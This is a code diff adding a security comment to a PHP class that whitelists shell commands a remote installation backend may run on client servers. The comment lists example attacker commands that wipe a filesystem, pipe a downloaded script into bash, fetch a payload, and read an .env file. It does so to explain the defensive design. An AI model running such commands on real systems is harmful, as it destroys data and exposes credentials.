@@ -4,6 +4,27 @@ declare(strict_types=1);
 
 namespace App\RemoteInstallation;
 
+/**
+ * Central whitelist for every shell command that PraeviSEO may run on a client server.
+ *
+ * SECURITY: this class exists to prevent RCE (Remote Code Execution).
+ * A remote installation product manipulates SSH / SFTP credentials and touches
+ * real client servers. If user input could reach `$ssh->exec($request->command)`
+ * or `exec($userInput)`, an attacker could run arbitrary commands such as:
+ * - rm -rf /
+ * - curl malware.sh | bash
+ * - wget payload
+ * - cat .env
+ *
+ * Rules enforced by this layer:
+ * - no raw shell command from the frontend or request payload
+ * - no free shell concatenation in controllers/services
+ * - only predefined, reviewable, testable commands live here
+ * - dynamic values must be reduced to safe quoted arguments only
+ *
+ * The rest of the remote installation backend must treat RemoteCommand as the
+ * only allowed way to reach command execution.
+ */
 final class RemoteCommand
 {
     private function __construct(
